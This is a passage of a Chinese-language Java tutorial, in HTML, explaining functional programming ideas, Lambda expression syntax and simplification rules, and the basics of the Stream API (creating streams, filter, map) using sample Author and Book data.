id="12-函数式编程思想"><a class="markdownIt-Anchor" href="#12-函数式编程思想"></a> 1.2 函数式编程思想</h3><h4 id="121-概念"><a class="markdownIt-Anchor" href="#121-概念"></a> 1.2.1 概念</h4><p>​面向对象思想需要关注用什么对象完成什么事情。而函数式编程思想就类似于我们数学中的函数。它主要关注的是对数据进行了什么操作。</p><h4 id="122-优点"><a class="markdownIt-Anchor" href="#122-优点"></a> 1.2.2 优点</h4><ul><li>代码简洁，开发快速</li><li>接近自然语言，易于理解</li><li>易于&quot;并发编程&quot;</li></ul><h2 id="2-lambda表达式"><a class="markdownIt-Anchor" href="#2-lambda表达式"></a> 2. Lambda表达式</h2><h3 id="21-概述"><a class="markdownIt-Anchor" href="#21-概述"></a> 2.1 概述</h3><p>​Lambda是JDK8中一个语法糖。他可以对某些匿名内部类的写法进行简化。它是函数式编程思想的一个重要体现。让我们不用关注是什么对象。而是更关注我们对数据进行了什么操作。</p><h3 id="22-核心原则"><a class="markdownIt-Anchor" href="#22-核心原则"></a> 2.2 核心原则</h3><blockquote><p>可推导可省略</p></blockquote><h3 id="2-3-基本格式"><a class="markdownIt-Anchor" href="#2-3-基本格式"></a> 2. 3 基本格式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">(参数列表)-&gt;&#123;代码&#125;<br></code></pre></td></tr></table></figure><h4 id="例一"><a class="markdownIt-Anchor" href="#例一"></a> 例一</h4><p>我们在创建线程并启动时可以使用匿名内部类的写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;你知道吗 我比你想象的 更想在你身边&quot;</span>);<br>    &#125;<br>&#125;).start();<br></code></pre></td></tr></table></figure><p>可以使用Lambda的格式对其进行修改。修改后如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>    System.out.println(<span class="hljs-string">&quot;你知道吗 我比你想象的 更想在你身边&quot;</span>);<br>&#125;).start();<br></code></pre></td></tr></table></figure><h4 id="例二"><a class="markdownIt-Anchor" href="#例二"></a> 例二:</h4><p>现有方法定义如下，其中IntBinaryOperator是一个接口。先使用匿名内部类的写法调用该方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateNum</span><span class="hljs-params">(IntBinaryOperator operator)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">return</span> operator.applyAsInt(a, b);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> calculateNum(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntBinaryOperator</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">applyAsInt</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> &#123;<br>            <span class="hljs-keyword">return</span> left + right;<br>        &#125;<br>    &#125;);<br>    System.out.println(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambda写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> calculateNum((<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)-&gt;&#123;<br>        <span class="hljs-keyword">return</span> left + right;<br>    &#125;);<br>    System.out.println(i);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="例三"><a class="markdownIt-Anchor" href="#例三"></a> 例三：</h4><p>现有方法定义如下，其中IntPredicate是一个接口。先使用匿名内部类的写法调用该方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printNum</span><span class="hljs-params">(IntPredicate predicate)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;<br>        <span class="hljs-keyword">if</span>(predicate.test(i))&#123;<br>            System.out.println(i);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    printNum(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntPredicate</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br>            <span class="hljs-keyword">return</span> value%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambda写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    printNum((<span class="hljs-type">int</span> value)-&gt; &#123;<br>        <span class="hljs-keyword">return</span> value%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>;<br>    &#125;);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printNum</span><span class="hljs-params">(IntPredicate predicate)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;<br>        <span class="hljs-keyword">if</span>(predicate.test(i))&#123;<br>            System.out.println(i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="例四"><a class="markdownIt-Anchor" href="#例四"></a> 例四：</h4><p>现有方法定义如下，其中Function是一个接口。先使用匿名内部类的写法调用该方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;R&gt; R <span class="hljs-title function_">typeConver</span><span class="hljs-params">(Function&lt;String,R&gt; function)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1235&quot;</span>;<br>    <span class="hljs-type">R</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> function.apply(str);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> typeConver(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;String, Integer&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">apply</span><span class="hljs-params">(String s)</span> &#123;<br>            <span class="hljs-keyword">return</span> Integer.valueOf(s);<br>        &#125;<br>    &#125;);<br>    System.out.println(result);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambda写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> typeConver((String s)-&gt;&#123;<br>    <span class="hljs-keyword">return</span> Integer.valueOf(s);<br>&#125;);<br>System.out.println(result);<br><br></code></pre></td></tr></table></figure><h4 id="例五"><a class="markdownIt-Anchor" href="#例五"></a> 例五：</h4><p>现有方法定义如下，其中IntConsumer是一个接口。先使用匿名内部类的写法调用该方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">foreachArr</span><span class="hljs-params">(IntConsumer consumer)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;<br>        consumer.accept(i);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    foreachArr(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntConsumer</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br>            System.out.println(value);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambda写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    foreachArr((<span class="hljs-type">int</span> value)-&gt;&#123;<br>        System.out.println(value);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="24-省略规则"><a class="markdownIt-Anchor" href="#24-省略规则"></a> 2.4 省略规则</h3><ul><li>参数类型可以省略</li><li>方法体只有一句代码时大括号return和唯一一句代码的分号可以省略</li><li>方法只有一个参数时小括号可以省略</li><li>以上这些规则都记不住也可以省略不记</li></ul><h2 id="3-stream流"><a class="markdownIt-Anchor" href="#3-stream流"></a> 3. Stream流</h2><h3 id="31-概述"><a class="markdownIt-Anchor" href="#31-概述"></a> 3.1 概述</h3><p>​Java8的Stream使用的是函数式编程模式，如同它的名字一样，它可以被用来对集合或数组进行链状流式的操作。可以更方便的让我们对集合或数组操作。</p><h3 id="32-案例数据准备"><a class="markdownIt-Anchor" href="#32-案例数据准备"></a> 3.2 案例数据准备</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@EqualsAndHashCode</span><span class="hljs-comment">//用于后期的去重使用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Author</span> &#123;<br>    <span class="hljs-comment">//id</span><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-comment">//姓名</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">//年龄</span><br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-comment">//简介</span><br>    <span class="hljs-keyword">private</span> String intro;<br>    <span class="hljs-comment">//作品</span><br>    <span class="hljs-keyword">private</span> List&lt;Book&gt; books;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@EqualsAndHashCode</span><span class="hljs-comment">//用于后期的去重使用</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span> &#123;<br>    <br>    <span class="hljs-comment">//id</span><br>    <span class="hljs-keyword">private</span> Long id;<br>    <br>    <span class="hljs-comment">//书名</span><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-comment">//分类</span><br>    <span class="hljs-keyword">private</span> String category;<br><br>    <span class="hljs-comment">//评分</span><br>    <span class="hljs-keyword">private</span> Integer score;<br><br>    <span class="hljs-comment">//简介</span><br>    <span class="hljs-keyword">private</span> String intro;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Author&gt; <span class="hljs-title function_">getAuthors</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//数据初始化</span><br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">1L</span>,<span class="hljs-string">&quot;蒙多&quot;</span>,<span class="hljs-number">33</span>,<span class="hljs-string">&quot;一个从菜刀中明悟哲理的祖安人&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">2L</span>,<span class="hljs-string">&quot;亚拉索&quot;</span>,<span class="hljs-number">15</span>,<span class="hljs-string">&quot;狂风也追逐不上他的思考速度&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;易&quot;</span>,<span class="hljs-number">14</span>,<span class="hljs-string">&quot;是这个世界在限制他的思维&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;易&quot;</span>,<span class="hljs-number">14</span>,<span class="hljs-string">&quot;是这个世界在限制他的思维&quot;</span>,<span class="hljs-literal">null</span>);<br><br>    <span class="hljs-comment">//书籍列表</span><br>    List&lt;Book&gt; books1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    List&lt;Book&gt; books2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    List&lt;Book&gt; books3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">1L</span>,<span class="hljs-string">&quot;刀的两侧是光明与黑暗&quot;</span>,<span class="hljs-string">&quot;哲学,爱情&quot;</span>,<span class="hljs-number">88</span>,<span class="hljs-string">&quot;用一把刀划分了爱恨&quot;</span>));<br>    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">2L</span>,<span class="hljs-string">&quot;一个人不能死在同一把刀下&quot;</span>,<span class="hljs-string">&quot;个人成长,爱情&quot;</span>,<span class="hljs-number">99</span>,<span class="hljs-string">&quot;讲述如何从失败中明悟真理&quot;</span>));<br><br>    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;那风吹不到的地方&quot;</span>,<span class="hljs-string">&quot;哲学&quot;</span>,<span class="hljs-number">85</span>,<span class="hljs-string">&quot;带你用思维去领略世界的尽头&quot;</span>));<br>    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;那风吹不到的地方&quot;</span>,<span class="hljs-string">&quot;哲学&quot;</span>,<span class="hljs-number">85</span>,<span class="hljs-string">&quot;带你用思维去领略世界的尽头&quot;</span>));<br>    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">4L</span>,<span class="hljs-string">&quot;吹或不吹&quot;</span>,<span class="hljs-string">&quot;爱情,个人传记&quot;</span>,<span class="hljs-number">56</span>,<span class="hljs-string">&quot;一个哲学家的恋爱观注定很难把他所在的时代理解&quot;</span>));<br><br>    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">5L</span>,<span class="hljs-string">&quot;你的剑就是我的剑&quot;</span>,<span class="hljs-string">&quot;爱情&quot;</span>,<span class="hljs-number">56</span>,<span class="hljs-string">&quot;无法想象一个武者能对他的伴侣这么的宽容&quot;</span>));<br>    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">6L</span>,<span class="hljs-string">&quot;风与剑&quot;</span>,<span class="hljs-string">&quot;个人传记&quot;</span>,<span class="hljs-number">100</span>,<span class="hljs-string">&quot;两个哲学家灵魂和肉体的碰撞会激起怎么样的火花呢？&quot;</span>));<br>    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">6L</span>,<span class="hljs-string">&quot;风与剑&quot;</span>,<span class="hljs-string">&quot;个人传记&quot;</span>,<span class="hljs-number">100</span>,<span class="hljs-string">&quot;两个哲学家灵魂和肉体的碰撞会激起怎么样的火花呢？&quot;</span>));<br><br>    author.setBooks(books1);<br>    author2.setBooks(books2);<br>    author3.setBooks(books3);<br>    author4.setBooks(books3);<br><br>    List&lt;Author&gt; authorList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(Arrays.asList(author,author2,author3,author4));<br>    <span class="hljs-keyword">return</span> authorList;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="33-快速入门"><a class="markdownIt-Anchor" href="#33-快速入门"></a> 3.3 快速入门</h3><h4 id="331-需求"><a class="markdownIt-Anchor" href="#331-需求"></a> 3.3.1 需求</h4><p>​我们可以调用getAuthors方法获取到作家的集合。现在需要打印所有年龄小于18的作家的名字，并且要注意去重。</p><h4 id="332-实现"><a class="markdownIt-Anchor" href="#332-实现"></a> 3.3.2 实现</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//打印所有年龄小于18的作家的名字，并且要注意去重</span><br>List&lt;Author&gt; authors = getAuthors();<br>authors.<br>        stream()<span class="hljs-comment">//把集合转换成流</span><br>        .distinct()<span class="hljs-comment">//先去除重复的作家</span><br>        .filter(author -&gt; author.getAge()&lt;<span class="hljs-number">18</span>)<span class="hljs-comment">//筛选年龄小于18的</span><br>        .forEach(author -&gt; System.out.println(author.getName()));<span class="hljs-comment">//遍历打印名字</span><br></code></pre></td></tr></table></figure><h3 id="34-常用操作"><a class="markdownIt-Anchor" href="#34-常用操作"></a> 3.4 常用操作</h3><h4 id="341-创建流"><a class="markdownIt-Anchor" href="#341-创建流"></a> 3.4.1 创建流</h4><p>单列集合： <code>集合对象.stream()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      List&lt;Author&gt; authors = getAuthors();<br>Stream&lt;Author&gt; stream = authors.stream();<br></code></pre></td></tr></table></figure><p>数组：<code>Arrays.stream(数组)</code>或者使用<code>Stream.of</code>来创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">Integer[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>Stream&lt;Integer&gt; stream = Arrays.stream(arr);<br>Stream&lt;Integer&gt; stream2 = Stream.of(arr);<br></code></pre></td></tr></table></figure><blockquote><p>注意</p></blockquote><p><code>Stream.of</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] ints = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>Stream&lt;<span class="hljs-type">int</span>[]&gt; ints1 = Stream.of(ints);<br><span class="hljs-type">IntStream</span> <span class="hljs-variable">stream1</span> <span class="hljs-operator">=</span> Arrays.stream(ints);<br><br>Integer[] integers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[<span class="hljs-number">10</span>];<br>Stream&lt;Integer&gt; integerStream = Stream.of(integers);<br>Stream&lt;Integer&gt; stream2 = Arrays.stream(integers);<br></code></pre></td></tr></table></figure><p>双列集合：转换成单列集合后再创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String,Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;蜡笔小新&quot;</span>,<span class="hljs-number">19</span>);<br>map.put(<span class="hljs-string">&quot;黑子&quot;</span>,<span class="hljs-number">17</span>);<br>map.put(<span class="hljs-string">&quot;日向翔阳&quot;</span>,<span class="hljs-number">16</span>);<br><br>Stream&lt;Map.Entry&lt;String, Integer&gt;&gt; stream = map.entrySet().stream();<br></code></pre></td></tr></table></figure><h4 id="342-中间操作"><a class="markdownIt-Anchor" href="#342-中间操作"></a> 3.4.2 中间操作</h4><h5 id="filter"><a class="markdownIt-Anchor" href="#filter"></a> filter</h5><p>​可以对流中的元素进行条件过滤，符合过滤条件的才能继续留在流中。</p><p>例如：</p><p>​打印所有姓名长度大于1的作家的姓名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .filter(author -&gt; author.getName().length()&gt;<span class="hljs-number">1</span>)<br>        .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h5 id="map"><a class="markdownIt-Anchor" href="#map"></a> map</h5><p>​可以把对流中的元素进行计算或转换。</p><p>例如：</p><p>​打印所有作家的姓名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>authors<br>        .stream()<br>        .map(author -&gt; author.getName())<br>        .forEach(name-&gt;System.out.println(name));<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td 